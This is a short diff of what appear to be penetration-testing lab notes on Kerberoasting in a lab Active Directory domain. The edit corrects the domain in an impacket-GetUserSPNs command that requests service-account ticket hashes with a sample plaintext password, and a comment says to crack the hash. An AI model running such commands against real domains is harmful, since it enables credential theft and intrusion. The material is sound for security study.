@@ -30,7 +30,7 @@ marvel.local/http_service:80     http_svc             2025-10-06 18:11:38.764634
 marvel.local/mssql_service:1433  mssql_svc            2025-10-06 18:11:38.447371  <never>  
 
 # Now get the hash
-impacket-GetUserSPNs -dc-ip 'ip_address' 'simply.cyber/alice.wonderland:P@ssw0rd!' -request
+impacket-GetUserSPNs -dc-ip 'ip_address' 'marvel.local/alice.wonderland:P@ssw0rd!' -request
 
 # Copy the hash and crack the password
 ```
